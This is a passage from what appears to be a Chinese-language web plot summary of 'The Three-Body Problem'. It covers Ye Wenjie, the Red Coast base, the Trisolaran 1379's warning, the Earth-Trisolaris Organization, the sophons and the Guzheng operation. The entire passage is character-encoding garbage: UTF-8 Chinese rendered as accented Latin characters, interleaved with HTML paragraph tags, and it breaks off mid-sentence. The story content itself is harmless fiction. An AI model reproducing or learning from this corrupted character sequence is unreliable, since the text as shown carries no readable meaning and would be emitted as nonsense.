èµèµï¼Œæ•´å°ä¿¡å†…å®¹ä¸°å¯Œï¼Œé€»è¾‘ç¼œå¯†ï¼Œä»¤ä»–ä¿¡æœï¼Œä½†è¿™ä¸ªè®°è€…é•¿æœŸå¹²é‡æ´»ï¼Œå¯¼è‡´æ‰‹æŠ–çš„å‰å®³ï¼Œäºæ˜¯å¶æ–‡æ´å°±å¸®çŸ¥å·±é‡æ–°æŠ„äº†ä¸€éï¼Œåæ¥ä¸Šçº§è¿½æŸ¥äº†ä¸‹æ¥ï¼Œè®¤ä¸ºè¿™æ˜¯ååŠ¨çš„è¡Œå¾„ã€‚äºæ˜¯ä¹è¿™ä½çŸ¥å·±ä¾¿å‡ºå–äº†å¶æ–‡æ´ï¼Œè¯´è‡ªå·±å¹¶ä¸çŸ¥é“ä¿¡çš„å†…å®¹ï¼Œè¿™ä¸€ä¸‹å…¨éƒ¨çš„è´£ä»»éƒ½æ¨ç»™äº†å¶æ–‡æ´ï¼Œå¶æ–‡æ´è¢«å…³è¿›äº†çœ‹å®ˆæ‰€ï¼Œåœ¨çœ‹å®ˆæ‰€å¥¹æ‹’ç»ç­¾å­—é™·å®³å¥¹çš„çˆ¶äº²ï¼Œå—åˆ°äº†å˜æœ¬åŠ å‰çš„è¿«å®³ï¼Œè¿™ä¸€åˆ‡çš„ä¸‘æ¶è®©å¥¹å¿ƒä¸­çš„åäººç±»ç§å­é•¿æˆäº†å‚å¤©å¤§æ ‘ã€‚å¯¹äººç±»å½»åº•çš„ç»æœ›äº†ã€‚åæ¥å¶æ–‡æ´çˆ¶äº²çš„å­¦ç”Ÿæ¨ä¼Ÿå®å¾—çŸ¥æ­¤äº‹åï¼Œé€šè¿‡è®©å¥¹å‚ä¸çº¢å²¸åŸºåœ°çš„çº¢å²¸è®¡åˆ’æ•‘å‡ºäº†å¶æ–‡æ´ã€‚</p><p>&emsp;&emsp;çº¢å²¸è®¡åˆ’çš„ä¸»è¦ç›®çš„æ˜¯å¯»æ‰¾å¤–æ˜Ÿäººï¼Œä»¥æ±‚ç§‘æŠ€é£è·ƒï¼Œè¿™ä¸ªè®¡åˆ’éœ€è¦çš„äººæ‰æå…¶è‹›åˆ»ï¼Œä¸è¿‡å¶æ–‡æ´çš„æ¡ä»¶æ­£å¥½ç¬¦åˆï¼Œä½†åŠ å…¥çš„ä»£ä»·æ˜¯æ°¸è¿œç•™åœ¨åŸºåœ°ï¼Œä¸ä¸–éš”ç»ã€‚ç»æœ›çš„å¶æ–‡æ´è¿˜ä¸çŠ¹è±«åœ°ç­”åº”äº†ã€‚å‡ å¹´åï¼Œå¶æ–‡æ´å’Œè¿™ä½çˆ¶äº²çš„å­¦ç”Ÿï¼Œè‡ªå·±çš„æ©äººï¼Œæ¨ä¼Ÿå®ç»„å»ºäº†å®¶åº­ï¼Œç”Ÿäº†ä¸€ä¸ªå¥³å„¿ï¼Œæ¨å†¬ã€‚</p><p>&emsp;&emsp;å·¥ä½œæœŸé—´ï¼Œèªæ˜çš„å¶æ–‡æ´åˆ©ç”¨å¤ªé˜³å¼ºåŒ–å¤©çº¿åŠŸç‡ï¼Œå‘å¤ªç©ºå‘å‡ºäº†åœ°çƒçš„ç¬¬ä¸€å°ä¿¡ï¼Œé‡Œé¢åŒ…å«ç€åœ°çƒæ–‡æ˜çš„åŸºæœ¬ä¿¡æ¯ã€‚è¿™ä¸ªä¿¡å·ï¼Œå¯æ˜¯ä¸‰ä½“äººåšæ¢¦éƒ½åœ¨æ‰¾çš„ï¼Œæ”¶åˆ°å¶æ–‡æ´ä¿¡å·çš„æ˜¯é‚£ä¸ªå«1379å·çš„ä¸‰ä½“äººã€‚ä¸‰ä½“çš„æ–‡æ˜æ˜¯é«˜åº¦é›†æƒçš„ï¼Œå¤„äºæç«¯çš„ä¸“åˆ¶ä¸­ï¼Œå¯¹ä¸ªä½“çš„å°Šé‡å‡ ä¹ä¸å°Šé‡ã€‚æœ‰å¤šä¸å°Šé‡å‘¢ï¼Ÿä¸èƒ½å·¥ä½œçš„äººï¼Œå°±å¾—æ­»ã€‚æ¯•ç«Ÿåœ¨è¿™ç§æ˜Ÿçƒç¯å¢ƒä¸‹ï¼Œé›†æƒæ‰èƒ½å¿«é€Ÿå‘å±•ä¸‰ä½“çš„æ–‡æ˜ã€‚1379å·å­¤ç‹¬åœ°ç”Ÿæ´»äº†å¤§åŠè¾ˆå­ï¼Œ1379å·æ‰€åœ¨çš„ç›‘å¬ç«™ï¼Œå·²ç»æœ‰ä¸Šåƒå¹´çš„å†å²äº†ã€‚è¿™é‡Œåªæœ‰ä»–ä¸€ä¸ªäººï¼Œä»–æ¯å¤©éƒ½åœ¨ä¸€ä¸ªå°æˆ¿å­é‡Œï¼Œä½œè€…ç›‘å¬å®‡å®™ä¿¡å·è¿™ç§æ— èŠåº•å±‚çš„å·¥ä½œã€‚åœ¨ä¸‰ä½“ä¸–ç•Œé‡Œï¼Œè¿™æ˜¯ä¸€ä¸ªå‘å¾®çš„èŒä¸šï¼Œå¤„åœ¨ç¤¾ä¼šçš„æœ€åº•å±‚ï¼Œæ²¡æœ‰äººæ³¨æ„ä»–ï¼Œæ›´æ‚²å‚¬çš„æ˜¯ï¼Œä»–ä¸€è¾ˆå­ä»€ä¹ˆä¹Ÿæ²¡å¬åˆ°ã€‚å‘½è¿æ€»æ˜¯ä¸æœŸè€Œé‡ï¼Œ1379å·æ”¶åˆ°äº†å¶æ–‡æ´çš„ä¿¡å·ï¼Œä»–çœ‹åˆ°ä¿¡æ¯æ—¶éå¸¸æ„ŸåŠ¨ï¼Œæ¯•ç«Ÿä»–ç­‰äº†ä¸€è¾ˆå­ï¼Œä»–é€šè¿‡è‡ªè¯‘è§£ç³»ç»Ÿï¼Œçœ‹æ‡‚äº†å¶æ–‡æ´å‘æ¥çš„ä¿¡æ¯ï¼Œä»–å‘ç°è¿™ä¸ªé¥è¿œçš„æ˜Ÿçƒï¼Œå°±æ˜¯è‡ªå·±æ¢¦ä¸­çš„å¤©å ‚ï¼Œå…¨ä¸‰ä½“äººå¿ƒä¸­ç†æƒ³çš„å®¶å›­ã€‚ä»–ä¸æƒ³æŠŠè¿™ä¸€æ¶ˆæ¯é€šçŸ¥ä¸Šçº§ï¼Œä»–çŸ¥é“è¿™æ„å‘³ç€åœ°çƒä¼šè¢«ä¾µç•¥ï¼Œè€Œä¸”å³ä¾¿ä¸‰ä½“äººæˆåŠŸå é¢†åœ°çƒï¼Œä¹Ÿå’Œä»–æ²¡å…³ç³»ï¼Œå¹¶ä¸”ä¸€æ—¦ä»–å®Œæˆä»»åŠ¡ï¼Œä»–å°†å¾ˆæœ‰å¯èƒ½å¤±å»åœ¨ç¤¾ä¼šä¸­å­˜åœ¨çš„ä»·å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´1379çš„æˆåŠŸï¼Œä¸ä¼šæ”¹å˜ä»–å­¤ç‹¬è€Œå‘å¾®çš„ç”Ÿæ´»ï¼Œè¯´ä¸å®šè¿˜ä¼šæ›´ç³Ÿã€‚æ¸æ¸åœ°ä»–çˆ±ä¸Šäº†è¿™é¢—é¥è¿œçš„ç¾ä¸½æ˜Ÿçƒï¼Œäºæ˜¯ä»–ç»™å¶æ–‡æ´å›å¤äº†è¿™ä¹ˆä¸€æ®µä¿¡æ¯ï¼Œä¸è¦å›ç­”ï¼Œä¸è¦å›ç­”ï¼Œä¸è¦å›ç­”ã€‚åé¢è¿˜æœ‰ä¸€æ®µä¿¡æ¯ï¼Œå¤§è‡´å†…å®¹å¦‚ä¸‹ï¼šæˆ‘æ˜¯ä¸€ä¸ªå’Œå¹³ä¸»ä¹‰è€…ï¼Œæˆ‘ä¸çŸ¥é“ä½ æ˜¯è°ï¼Œåœ¨ä½ çš„ä¿¡å·æ¥æºçš„æ–¹å‘ï¼Œæ˜¯æœ‰æ— æ•°é¢—è¡Œæ˜Ÿçš„ã€‚æˆ‘ä»¬æ— æ³•ç¡®å®šä½ ä»¬çš„ä½ç½®ï¼Œä½†åªè¦ä½ å›å¤ï¼Œæˆ‘ä»¬ä¸€å®šä¼šæ‰¾åˆ°ä½ ä»¬ï¼Œæˆ‘ä»¬ä¸€å®šä¼šä¾µç•¥åœ°çƒã€‚è¿™ä¸€æ¡ä¿¡æ¯ï¼Œç›¸å½“äºæŠŠä¸‰ä½“äººåƒå¹´ç­‰ä¸€å›çš„æœºä¼šç»™æ”¾å¼ƒäº†ã€‚è¿™æ¡ä¿¡æ¯ä¸€å‘å‡ºå»ï¼Œ1379é©¬ä¸Šå°±ç»™æŠ“ä½äº†ï¼Œç”±äº1379å·²ç»å¾ˆè€äº†ï¼Œå…ƒé¦–ç»™äº†ä»–è‡ªç”±ï¼Œæƒ³è®©ä»–æ´»åˆ°åœ°çƒå¤±å»ä¸€åˆ‡å¸Œæœ›çš„é‚£ä¸€å¤©ï¼Œè®©å®ƒç¾ç¾æ¢¦ç ´è£‚ï¼Œè¿™å«æ€äººè¯›å¿ƒã€‚ä¸æ­¤åŒæ—¶ï¼Œå…ƒé¦–ä¸‹ä»¤ï¼Œå¤„æ­»ä¸æ­¤ç›¸å…³çš„å…¶ä½™å…­åƒä½ä¸‰ä½“äººã€‚</p><p>&emsp;&emsp;å¶æ–‡æ´æ”¶åˆ°å¤–æ˜Ÿäººçš„å›å¤åï¼ŒæƒŠè®¶ä¸å·²ï¼Œå¿ƒè·³åŠ é€Ÿï¼Œå·²ç»æ— æ³•å†·é™æ€è€ƒçš„å¥¹ï¼Œå¥¹è®¤ä¸ºäººç±»å·²ç»æ²¡å¸Œæœ›äº†ï¼Œæ‰€ä»¥ä»–æƒ³é€šè¿‡ä¸‰ä½“äººè¿™ä¸ªå¤–åŠ›ï¼Œæ¥å¸®åŠ©äººç±»ã€‚ä¾¿å›å¤äº†ï¼šæ¥å§æ¥å¸®åŠ©æˆ‘ä»¬å§ï¼Œæ¥ä¾µç•¥æˆ‘ä»¬å§ï¼Œæˆ‘æ¥å¸®ä½ ä»¬è·å¾—åœ°çƒã€‚ä¸ä¹…åï¼Œå¶æ–‡æ´çš„ä¸Šçº§å‘ç°äº†å“ªé‡Œä¸å¯¹ï¼ŒçŸ¥é“äº†ä»–æ˜¯åœ¨å’Œå¤–æ˜Ÿäººè”ç³»ã€‚å½“é‚£ä½ä¸Šçº§å»æ‚¬å´–ä¸‹é¢æ£€æŸ¥ä»ªå™¨çš„æ—¶å€™ï¼Œå¶æ–‡æ´ä¸ºäº†ä¿è¯ç§˜å¯†ä¸è¢«æ³„éœ²ï¼Œå†·é™æ·¡å®šçš„é”¯æ–­äº†ç»³ç´¢ï¼Œå¯¼è‡´é¢†å¯¼å å´–èº«äº¡ï¼Œæå¸¦ç€æŠŠè‡ªå·±è€å…¬ä¹Ÿæ€äº†ã€‚åæ¥è¿™ä¸ªå å´–äº‹ä»¶ï¼Œè¢«å½“åšæ™®é€šçš„å·¥ä½œäº‹æ•…å¤„ç†äº†ï¼Œæ²¡äººå¯¹å¶æ–‡æ´èµ·ç–‘å¿ƒã€‚é”¯æ–­ç»³å­çš„é‚£ä¸€åˆ»ï¼Œå¶æ–‡æ´å°±å·²ç»ä¸‹å®šå†³å¿ƒï¼Œä»ä»Šå„¿èµ·ï¼Œè€å¨˜å°±è¦æŠŠé©å‘½çš„äº‹ä¸šè¿›è¡Œåˆ°åº•ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººé‚£è¾¹ï¼Œ1379åˆšæ£ä¹±å°±è¢«æŠ“äº†ï¼Œä½†å¶æ–‡æ´å›å¤æ—¶å´æ²¡äººçŸ¥é“ã€‚å¥¹å°±åœ¨è¿™ç§æ²¡äººç›´æ¥å¹²é¢„çš„æƒ…å†µä¸‹ï¼Œä¸ºå…¨äººç±»ä¹Ÿåšäº†ä¸ªè¦å‘½çš„å†³å®šã€‚å¶æ–‡æ´è¿™æ¡ä¿¡æ¯ï¼Œé£äº†å››å¹´åˆ°è¾¾äº†ä¸‰ä½“æ˜Ÿçƒï¼Œä¸‰ä½“äººå¯¹è¿™çªå¦‚å…¶æ¥çš„å¹¸è¿ï¼Œæ„Ÿåˆ°æ— æ¯”å¹¸ç¦ã€‚æ¯•ç«Ÿåœ°çƒç¦»å¾—è¿™ä¹ˆè¿‘ï¼Œäºæ˜¯ä¸‰ä½“äººæŠŠæ‰€æœ‰èµ„æºéƒ½ç”¨åœ¨äº†é€ é£èˆ¹ä¸Šï¼Œä¹‹åä¸‰ä½“äººè”ç³»ä¸Šå¶æ–‡æ´ï¼Œè¯·å¥¹åšå¥½æ¥åº”å·¥ä½œï¼Œè¿™ä¸€éƒ¨åˆ†å°±æ˜¯æ•´ä¸ªæ•…äº‹çš„å¼€ç«¯ã€‚</p><p>&emsp;&emsp;1379å’Œå¶æ–‡æ´è¿™ä¸¤ä¸ªæ— åå°å’ï¼Œä¸€ä¸ªå·®ç‚¹è®©ä¸‰ä½“äººå¯¹ç”Ÿå­˜çš„æœºä¼šå¤±ä¹‹äº¤è‡‚ï¼Œè€Œå¦ä¸€ä¸ªç»™å…¨äººç±»å¸¦æ¥äº†å‡ ç™¾å¹´çš„å™©æ¢¦ï¼Œåœ¨ä»¥å‰ä¿¡æ¯é—­å¡çš„æ—¶ä»£ï¼Œæ²¡æœ‰æƒåŠ¿çš„æ— åå°å’ï¼Œæ˜¯ä¸å¯èƒ½å½±å“æ•´ä¸ªä¸–ç•Œæ–‡æ˜çš„ã€‚ä½†å¦‚ä»Šè¿™ä¿©äººèŠç€å¤©ï¼Œå°±æŠŠå„è‡ªæ˜Ÿçƒçš„æ–‡æ˜ï¼Œç¿»æ¥è¦†å»æ”¹å˜äº†ä¸¤æ¬¡ã€‚è¿™é‡Œè­¦ç¤ºäº†æˆ‘ä»¬ï¼Œè®©å¤–æ˜ŸäººçŸ¥é“æˆ‘ä»¬åœ¨å“ªï¼Œæ˜¯ä¸€ä»¶ç‰¹åˆ«ä¸ç€è°ƒçš„äº‹ã€‚éœé‡‘åœ¨ä¹‹å‰ä¹Ÿè¯´äº†å‡ ä¹ä¸€æ ·çš„è§‚ç‚¹ï¼Œåƒä¸‡åˆ«è·Ÿå¤–æ˜Ÿäººçè”ç³»ã€‚</p><p>&emsp;&emsp;æ–‡é©è¿‡å»äº†ï¼Œå¶æ–‡æ´ç»ˆäºå¾—ä»¥å¹³åï¼Œèµ°å‡ºäº†æ·±å±±ï¼Œå¹¶ä¸”å¯ä»¥å›åˆ°æ¯æ ¡ä»»æ•™ã€‚ç”±äºèµ„å†æ·±ï¼Œå¶æ–‡æ´è¢«é€‰ä¸­å»è´Ÿè´£å‘å°„åŸºåœ°çš„é€‰å€é¡¹ç›®ã€‚å¥¹åœ¨è¥¿åŒ—åœ°åŒºè®¤è¯†äº†ä¸€ä¸ªçƒ­çˆ±å¤§è‡ªç„¶çš„å›½å¤–å¯ŒäºŒä»£ä¼Šæ–‡æ€ï¼Œä¼Šæ–‡æ€ä¹Ÿæ˜¯åæ¥åœ¨åœ°çƒæ¥åº”ä¸‰ä½“äººçœŸæ­£è´Ÿè´£äººã€‚ä»–è™½ç„¶å¯Œç”²ä¸€æ–¹ï¼Œä½†ä»–ä¾ç„¶æ”¹å˜ä¸äº†äººä»¬å¯¹åœ°çƒç¯å¢ƒçš„ç ´åï¼Œä»–ä¸€æ ·æœŸæœ›ç€é€šè¿‡å¤–æ˜Ÿäººçš„åŠ›é‡æ¥å¸®åŠ©äººç±»ï¼Œäºæ˜¯ä¼Šæ–‡æ€å’Œå¶æ–‡æ´å†³å®šæºæ‰‹å…±åˆ›è¾‰ç…Œï¼Œä¸¤äººæˆä¸ºäº†åœ°çƒä¸Šä¸‰ä½“ç»„ç»‡çš„åˆ›å§‹äººã€‚ä»–ä»¬ç›¸äº’è¡¨è¾¾æ•¬æ„ï¼Œä¼Šæ–‡æ€è¯´å‡ºäº†ä»¥åï¼Œåœ°çƒä¸‰ä½“ç»„ç»‡æ¥çº³æ–°æˆå‘˜æ—¶å¿…è¯´çš„ä¸€å¥è¯ï¼Œæˆ‘ä»¬æ˜¯åŒå¿—äº†ã€‚</p><p>&emsp;&emsp;å¤šå¹´è¿‡åä¼Šæ–‡æ€åœ¨ç§˜å¯†åœ°åœ¨ä¸€è‰˜å·¨è½®ä¸Šï¼Œåˆ›ç«‹äº†ç¬¬äºŒçº¢å²¸åŸºåœ°ï¼Œåœ¨å·¨è½®ä¸Šå»ºç«‹æ˜¯ä¸ºäº†æ–¹ä¾¿ç§»åŠ¨ä¾¿äºéšè—ã€‚æ ¹æ®å¶æ–‡æ´æä¾›çš„ä¿¡æ¯ï¼Œä¼Šæ–‡æ€ä¸ä¸‰ä½“äººå»ºç«‹äº†é€šè®¯ï¼Œè¿™é‡Œçš„äººå°†å¶æ–‡æ´ç§°ä¹‹ä¸ºæœ€é«˜ç»Ÿå¸…ï¼Œè¿™ä¸ªåäººç±»çš„ç»„ç»‡ï¼Œç›®çš„å¾ˆæ˜ç¡®ï¼Œæ¶ˆç­äººç±»æš´æ”¿ï¼Œä¸–ç•Œå±äºä¸‰ä½“ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººæ´¾å‡ºäº†ä¸€ç§å«æ™ºå­çš„ä¸œè¥¿ï¼Œæ¥å°é”åœ°çƒçš„åŸºç¡€ç§‘å­¦ã€‚æ™ºå­æ˜¯ä¸€ä¸ªè¶…çº§å¾®å‹æœºå™¨äººï¼Œå®ƒéå¸¸çš„å°ï¼Œå¯ä»¥è¢«åŠ é€Ÿåˆ°æ¥è¿‘å…‰é€Ÿï¼Œåªè¦å››å¹´å¤šçš„æ—¶é—´ï¼Œå®ƒå°±å¯ä»¥ä»ä¸‰ä½“è¡Œæ˜Ÿè¾¾åˆ°åœ°çƒã€‚ä¸‰ä½“äººå¯¹å¾®è§‚ä¸–ç•Œçš„ç ”ç©¶è¿œè¶…äººç±»ï¼Œæ™ºå­çš„åˆ¶é€ åŸç†éå¸¸æ™¦æ¶©éš¾æ‡‚ï¼Œä¸‰ä½“çš„ç§‘å­¦å®¶å…ˆæŠŠå¤åˆç²’å­ä¸­çš„è´¨å­å±•å¼€æˆäºŒç»´ï¼Œç„¶ååœ¨è´¨å­å®è¾¾çš„äºŒç»´å±•å¼€é¢ä¸Šï¼Œæ­å»ºé›†æˆç”µè·¯ï¼Œåˆ¶é€ å¥½åï¼Œå†æŠŠå®ƒæ”¶ç¼©å›æ™®é€šè´¨å­çš„å¤§å°ï¼Œè¿™æ ·ï¼Œè¿™ä¸ªå¾®è§‚ç²’å­ï¼Œå°±å˜æˆäº†è¶…çº§æ™ºèƒ½è®¡ç®—æœºã€‚ç”±äºæ™ºå­çš„æ£ä¹±ï¼Œå›½é™…çŸ¥åç»„ç»‡ï¼Œç§‘å­¦è¾¹ç•Œé‡Œå¾ˆå¤šæ°å‡ºçš„ç§‘å­¦å®¶çº·çº·è‡ªæ€ï¼Œå¯è§ä¸‰ä½“äººæŠŠäººç±»ç§‘å­¦å®¶é€¼æˆä»€ä¹ˆæ ·äº†ã€‚ç»æ”¿åºœæœºæ„é‚€è¯·ï¼Œä¸€ä½äº”å¤§ä¸‰ç²—ï¼Œä¸€è„¸æ¨ªè‚‰ä¸ä¿®è¾¹å¹…çš„å²å¼ºè­¦å¯Ÿï¼Œå’Œä¸€åç ”ç©¶çº³ç±³ææ–™çš„æ±ªæ·¼æ•™æˆï¼Œå¼€å§‹è°ƒæŸ¥æ­¤äº‹ã€‚è‡ªæ€åå•ä¸­ï¼Œè¿˜åŒ…æ‹¬äº†å¶æ–‡æ´çš„å¥³å„¿æ¨å†¬ï¼Œå®¶äººå‘ç°äº†å¥¹æœç”¨äº†å¤§é‡å®‰çœ è¯ï¼Œæ­»åœ¨äº†åºŠä¸Šã€‚æ¨å†¬çš„ç”·å‹ä¸ä»ªï¼Œç»™æ±ªæ·¼ä»–ä»¬çœ‹äº†æ¨å†¬çš„é—ä¹¦ã€‚é—ä¹¦å¾ˆç®€çŸ­ä¹Ÿæ²¡ç­¾å­—ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œç‰©ç†å­¦ä»æ¥å°±æ²¡æœ‰å­˜åœ¨è¿‡ã€‚å°†æ¥ä¹Ÿä¸ä¼šå­˜åœ¨ã€‚æˆ‘çŸ¥é“è‡ªå·±è¿™æ ·åšæ˜¯ä¸è´Ÿè´£ä»»çš„ï¼Œä½†åˆ«æ— é€‰æ‹©ã€‚å²å¼ºå’Œæ±ªæ·¼è¿™ä¿©äººï¼Œä¸€å¼€å§‹åƒç£é“çš„ä¸¤ä¸ªæ­£æä¸€æ ·åˆä¸æ¥ï¼Œä½†åœ¨åæ¥çš„åˆä½œä¸­ï¼Œä¸¤äººäº§ç”Ÿäº†æ„Ÿæƒ…ã€‚æ­£åœ¨è°ƒæŸ¥çš„æ±ªæ·¼ï¼Œçœ¼å‰çªç„¶å‡ºç°äº†ä¸€ç»„æ¶ˆæ•£ä¸å»ï¼Œæ­£åœ¨å€’è®¡æ—¶çš„æ•°å­—ï¼Œè¿™ç»„å¹½çµå€’è®¡æ—¶å¯æŠŠæ±ªæ·¼æŠ˜è…¾æƒ¨äº†ï¼Œå½“ä»–æš‚åœäº†å·¥ä½œï¼Œå»æ¢æ±‚çœŸç›¸åå€’è®¡æ—¶æ¶ˆå¤±äº†ã€‚æ±ªæ·¼é€šè¿‡å°„ç”µæœ›è¿œé•œï¼Œå‘ç°äº†å®‡å®™è¾å°„èƒŒæ™¯ä¸‹çš„å€’è®¡æ—¶ï¼Œä»–ç›¸ä¿¡ä¸€å®šæœ‰æŸç§ç¥å¥‡çš„åŠ›é‡ï¼Œé™åˆ¶ç€äººç±»ç§‘å­¦ã€‚è¿™å…¶å®ä¹Ÿæ˜¯æ™ºå­æçš„é¬¼ã€‚å®ƒä¸ä»…èƒ½é™åˆ¶äººç±»çš„å¾®è§‚ç ”ç©¶ï¼Œè¿˜èƒ½å±•å¼€æˆäºŒç»´ï¼Œå¹²æ‰°äººç±»çš„å®è§‚ç ”ç©¶ã€‚ç»è¿‡æ·±å…¥çš„è°ƒæŸ¥ï¼Œæ±ªæ·¼ä»–ä»¬å‘ç°äº†ä¸€æ¬¾åå«ä¸‰ä½“çš„æ¸¸æˆã€‚è¿™æ¸¸æˆéå¸¸çœŸå®ï¼Œå…¶å†…å®¹éƒ½æ˜¯å°½é‡è¿˜åŸä¸‰ä½“äººçš„ç”Ÿæ´»ç¯å¢ƒï¼Œå‡ ç»æ³¢æŠ˜åï¼Œæ±ªæ·¼é€šå…³äº†æ¸¸æˆï¼Œæ”¶åˆ°äº†å‚åŠ ä¸‰ä½“ç©å®¶çº¿ä¸‹èšä¼šçš„æ¶ˆæ¯ã€‚è´Ÿè´£äººè¯¢é—®å„ä½ç©å®¶ï¼Œæ˜¯å¦åŒæ„ä¸‰ä½“äººé™ä¸´åœ°çƒï¼Œæ±ªæ·¼å‡è£…åŒæ„ï¼Œæ‰“å…¥äº†æ•Œäººå†…éƒ¨ï¼Œè¿›å…¥ç»„ç»‡å†…éƒ¨çš„æ±ªæ·¼æƒŠè®¶å‘ç°ï¼Œè¿™ä¸ªç»„ç»‡çš„ç²¾ç¥é¢†è¢–ï¼Œæ­£å¼æ¨å†¬å¹´è¿ˆçš„æ¯äº²å¶æ–‡æ´ã€‚ä¸ä¹…ä¹‹åï¼Œå²å¼ºæ±ªæ·¼é‡Œåº”å¤–åˆæŠŠåœ°çƒå›å†›è¿™ä¸ªç»„ç»‡æ‹¿ä¸‹äº†ï¼Œå¶æ–‡æ´è¢«æ´»æ‰ï¼Œéšåå¤§å®¶ä¾¿çŸ¥é“äº†ç¬¬äºŒçº¢å²¸åŸºåœ°è¿™è‰˜é‚®è½®çš„å­˜åœ¨ã€‚é¢å¯¹è¿™å¸®å›å¾’ï¼Œå¹²æ‰ä»–ä»¬æ˜¯å…¶æ¬¡çš„ï¼Œæœ€é‡è¦çš„æ˜¯ï¼Œè·å¾—ä»–ä»¬ä¸ä¸‰ä½“äººçš„èŠå¤©è®°å½•ã€‚æ¯•ç«Ÿä»èŠå¤©è®°å½•é‡Œï¼Œèƒ½æŒæ¡å¤§é‡çš„åœ°æ–¹æƒ…æŠ¥ï¼Œä¹Ÿèƒ½çŸ¥é“å¯¹æ‰‹çš„è¦å®³åœ¨å“ªã€‚</p><p>&emsp;&emsp;äººä»¬ä¸ºäº†æ‹¿åˆ°è¿™ä»½èŠå¤©è®°å½•ï¼Œè´¹äº†åƒè¾›ä¸‡è‹¦ï¼Œé¦–å…ˆä¸Šèˆ¹æŠ“æ˜¯ä¸é è°±çš„ï¼Œè¿™å¸®äººéƒ½æ˜¯äº¡å‘½å¾’ï¼Œéšæ—¶å¯èƒ½è·Ÿæ•°æ®èµ„æ–™åŒå½’äºå°½ï¼Œä¹Ÿä¸èƒ½å¯¹è¿™è‰˜èˆ¹è¿›è¡Œå†›äº‹æ‰“å‡»ï¼Œä¸‡ä¸€ç‚¸äº†ï¼Œé‚£å°±åŠŸäºä¸€ç¯‘äº†ã€‚åœ¨å®¡é—®ä¸­äººä»¬å¾—çŸ¥äº†ä¸€ä¸ªåƒè½½éš¾é€¢çš„å¥½æœºä¼šï¼Œè¿™è‰˜èˆ¹ä¼šåœ¨æŸä¸€å¤©ç»è¿‡å·´æ‹¿é©¬è¿æ²³ã€‚è¿™ä¸ªè¿æ²³æœ€çª„çš„åœ°æ–¹å°±150ç±³ï¼Œå²å¼ºæƒ³äº†ä¸ªæ³•å­ï¼Œåœ¨æ²³çš„ä¸¤è¾¹æ¶èµ·ä¸¤æ ¹é«˜é«˜çš„æ†å­ï¼Œåœ¨æ†å­ä¸Šæ‹‰èµ·äº†è¶…éŸ§æ€§çš„çº³ç±³çº§ç»†ä¸ï¼Œæ¯éš”50cmæ‹‰ä¸€æ ¹ï¼Œè¿™äº›çœ‹ä¸è§çš„ç»†ä¸ï¼Œé”‹åˆ©æ— æ¯”ã€‚å¦‚æœè¿™è‰˜èˆ¹ç©¿è¿‡è¿™ä¸ªçº³ç±³ç»†ä¸ç»„æˆçš„å¢™ï¼Œèˆ¹å’Œäººéƒ½ä¼šåƒåˆ‡è±†è…ä¸€æ ·è¢«åˆ‡å¼€ï¼Œèˆ¹ä¸Šçš„ä»»ä½•äººéƒ½æ¥ä¸åŠä»»ä½•åº”æ€¥æªæ–½ã€‚å½“ç„¶ï¼Œç”¨æ¥å‚¨å­˜å„ç§æ•°æ®çš„ç¡¬ç›˜ï¼Œä¹Ÿä¼šè¢«åˆ‡å¼€ï¼Œä¸è¿‡ä¼šè¢«åˆ‡çš„å¾ˆå¹³æ•´ï¼Œæ˜¯å¯ä»¥è¿˜åŸçš„ã€‚è¿™æ¬¡è¡ŒåŠ¨è¢«ç§°ä¸ºå¤ç­è®¡åˆ’ã€‚å¤ç­è®¡åˆ’éå¸¸æˆåŠŸï¼Œè¿™è‰˜èˆ¹åƒä¸€å æ‰‘å…‹ç‰Œä¸€æ ·ï¼Œåˆ·çš„ä¸€ä¸‹å°±åˆ†å¼€äº†ï¼Œå˜æˆäº†åƒå±‚ç³•ï¼Œèˆ¹è¢«åˆ‡æˆäº†50å˜ç±³çš„è–„ç‰‡ï¼Œä¼Šæ–‡æ€ä¹Ÿè¢«åˆ‡æˆäº†ä¸‰æ®µã€‚äººä»¬åœ¨èˆ¹çš„åºŸå¢Ÿé‡Œï¼Œæ‰¾åˆ°äº†æƒ³è¦çš„èµ„æ–™ï¼Œä¸€å…±æœ‰28ä¸ªGï¼Œäººä»¬ä»”ç»†ç ”ç©¶äº†è¿™äº›èµ„æ–™ï¼Œå¾—åˆ°äº†ä¸¤ä¸ªéå¸¸é‡è¦çš„æƒ…æŠ¥ã€‚</p><p>&emsp;&emsp;ä¸€ä¸ªå¤§çš„åæ¶ˆæ¯æ˜¯ï¼Œæ™ºå­é™¤äº†å°é”äººç±»ç§‘æŠ€å‘å±•ï¼Œå®ƒè¿˜æ˜¯ä¸ªè¶…çº§ç›‘è§†å™¨ï¼Œå®ƒåˆ©ç”¨è‡ªå·±çš„å…‰é€Ÿç§»åŠ¨èƒ½åŠ›ç›‘è§†æ‰€æœ‰äººï¼Œå¹²æ‰°å„åˆ«ç§‘å­¦å®¶çš„è§†ç¥ç»ï¼Œæ¯ä¸€ä¸ªäººç±»è¯´çš„æ¯ä¸€å¥è¯ï¼Œåšçš„æ¯ä¸€ä»¶äº‹ï¼Œä¸‰ä½“äººéƒ½åœ¨å…¨ç¨‹çœ‹ç›´æ’­ã€‚å¦‚æ­¤é‡è¦çš„æƒ…æŠ¥ï¼Œè®©äººç±»çŸ¥é“ä»»ä½•å¼€ä¼šè®¨è®ºå‡ºæ¥çš„è®¡åˆ’ï¼Œéƒ½ä¼šè¢«ä¸‰ä½“äººçŸ¥é“ã€‚å¤ç­è®¡åˆ’çš„æˆåŠŸï¼Œå…¶å®æ˜¯ä¸‰ä½“äººä¸ºäº†å€Ÿäººç±»çš„æ‰‹ï¼Œæ¶ˆç­è¿™å¸®åœ°çƒå›å†›çš„è®¡åˆ’ã€‚å› ä¸ºä¸‰ä½“äººçš„æ€æƒ³æ˜¯é€æ˜çš„ï¼Œä»–ä»¬é€šè¿‡æ€ç»´ç›´æ¥äº¤æµï¼Œä¸ä¼šæ’’è°ï¼Œå½“ä»–ä»¬å¾—çŸ¥äººç±»æœ‰æ’’è°è¿™ä¸ªæŠ€èƒ½åï¼Œéå¸¸çš„ææƒ§ã€‚äººç±»åœ¨å¾—çŸ¥æœ‰æ™ºå­è¿™ä¸ªä¸œè¥¿åï¼Œæ™ºå­å°±ä¸èƒ½å†å¹²æ‰°äººç±»çš„å®è§‚è§‚æµ‹äº†ï¼Œå› 